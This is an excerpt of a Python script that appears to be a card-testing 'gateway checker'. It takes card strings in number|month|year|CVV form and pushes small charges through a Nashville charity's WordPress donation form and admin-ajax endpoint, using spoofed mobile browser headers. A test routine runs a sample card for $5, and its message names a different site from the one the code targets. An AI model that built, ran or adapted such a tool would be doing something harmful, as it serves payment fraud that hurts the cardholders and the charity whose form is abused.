...
def pp(ccx, amount="1.00", retry_count=1):
    ...
    try:
        ...
        response = r.get('https://abcnashville.org/donations/donation-to-abc-nashville-v2__trashed-v2/', headers=headers, timeout=20)
        ...
        headers = {
            ...
            'origin': 'https://abcnashville.org',
            'referer': 'https://abcnashville.org/donations/donation-to-abc-nashville-v2__trashed-v2/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        ...
        data = {
            ...
            'give-current-url': 'https://abcnashville.org/donations/donation-to-abc-nashville-v2__trashed-v2/',
            'give-form-url': 'https://abcnashville.org/donations/donation-to-abc-nashville-v2__trashed-v2/',
        ...
        response = r.post('https://abcnashville.org/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data, timeout=20)
        ...
        multipart_data = MultipartEncoder({
            ...
            'give-current-url': (None, 'https://abcnashville.org/donations/donation-to-abc-nashville-v2__trashed-v2/'),
            'give-form-url': (None, 'https://abcnashville.org/donations/donation-to-abc-nashville-v2__trashed-v2/'),
        ...
        response = r.post(
            'https://abcnashville.org/wp-admin/admin-ajax.php',
            params=params,
            headers=headers,
            data=multipart_data,
            timeout=20,
...
def test_gateway():
    test_cc = "5178058802985690|12|2029|478"
    print("🔍 Testing tdcaustralia.com.au gateway...")
    start = time.time()
    response, status = pp(test_cc, "5.00")
